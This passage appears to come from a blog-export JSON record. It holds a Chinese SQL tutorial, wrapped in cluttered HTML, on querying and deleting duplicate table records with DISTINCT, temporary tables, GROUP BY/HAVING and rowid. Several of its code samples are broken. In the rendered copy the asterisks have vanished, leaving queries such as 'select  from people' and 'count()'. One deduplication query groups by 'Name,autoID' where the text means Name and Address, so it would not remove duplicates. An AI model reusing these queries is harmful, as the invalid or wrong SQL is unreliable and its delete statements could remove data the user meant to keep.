onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法二<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">　　有两个意义上的重复记录，一是完全重复的记录，也即所有字段均重复的记录，二是部分关键字段重复的记录，比如Name字段重复，而其他字段不一定重复或都重复可以忽略。<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、对于第一种重复，比较容易解决，使用<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">就可以得到无重复记录的结果集。<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果该表需要删除重复的记录（重复记录保留1条），可以按以下方法删除<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;tableName&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">发生这种重复的原因是表设计不周产生的，增加唯一索引列即可解决。<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、这类重复问题通常要求保留重复记录中的第一条记录，操作方法如下<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">假设有重复的字段为Name,Address，要求得到这两个字段唯一的结果集<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">identity</span><span style=\"color: #000000\">(</span><span style=\"font-weight: bold; color: #000000\">int</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID,&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(autoID)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp2&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;Name,autoID<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#tmp2)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">最后一个select即得到了Name，Address不重复的结果集（但多了一个autoID字段，实际写时可以写在select子句中省去此列）<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(四)</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">查询重复<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;tablename&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;id&nbsp;</span><span style=\"color: #808080\">in</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;(<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;id&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tablename&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;id&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(id)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">)</font></span></div>\n</div>","slug":"SQL重复记录查询（转载）","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xoh001h5es56e5zb5wz","content":"<div id=\"cnblogs_post_body\"><div><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">&nbsp;1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;people<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;例二：</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;select</font>  <font color=\"#0000ff\">from</font> testtable</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;where</font> numeber in (<font color=\"#0000ff\">select</font> number <font color=\"#0000ff\">from</font> people <font color=\"#0000ff\">group by</font> number <font color=\"#0000ff\">having count</font>(number) &gt; 1 )</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;可以查出testtable表中number相同的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断，只留有rowid最小的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;people&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId&nbsp;)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">3</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段）&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">4</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录（多个字段），只留有rowid最小的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">5</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段），不包含rowid最小的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: 